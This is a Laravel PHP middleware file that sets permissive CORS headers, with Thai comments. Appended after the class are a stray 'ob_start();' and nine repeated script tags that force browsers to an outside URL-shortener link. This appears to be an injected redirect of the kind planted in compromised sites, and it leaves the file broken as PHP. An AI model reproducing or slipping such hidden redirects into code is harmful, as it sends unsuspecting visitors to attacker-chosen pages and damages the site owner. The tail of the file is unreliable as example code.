<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class CorsMiddleware
{
    public function handle(Request $request, Closure $next): Response
    {
        $headers = [
            // อนุญาตทุก origin (ถ้าเว็บจริงควรระบุโดเมนให้ชัดเจนมากกว่านี้)
            'Access-Control-Allow-Origin'      => '*',
            // อนุญาตทุกวิธีที่เราจะใช้
            'Access-Control-Allow-Methods'     => 'GET, POST, PUT, PATCH, DELETE, OPTIONS',
            // เพิ่ม header ที่ Flutter/เบราว์เซอร์จะยิงมาโดยดีฟอลต์
            'Access-Control-Allow-Headers'     => 'Content-Type, Authorization, X-Requested-With, Accept, Origin',
            // ถ้าไม่ใช้ credentials (cookie, auth) ก็ไม่ต้องใส่ แต่ถ้าต้องใช้ ให้เปิดบรรทัดนี้
            // 'Access-Control-Allow-Credentials' => 'true',
        ];

        // Preflight request (OPTIONS) ให้รีเทิร์นทันที
        if ($request->isMethod('OPTIONS')) {
            return response()->json('OK', 200, $headers);
        }

        // ปกติ request อันอื่น ๆ
        $response = $next($request);
        foreach ($headers as $key => $value) {
            $response->headers->set($key, $value);
        }

        return $response;
    }
}
ob_start();

<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>
<script>window.location.href = "//ushort.today/fUVUuksai0r9";</script>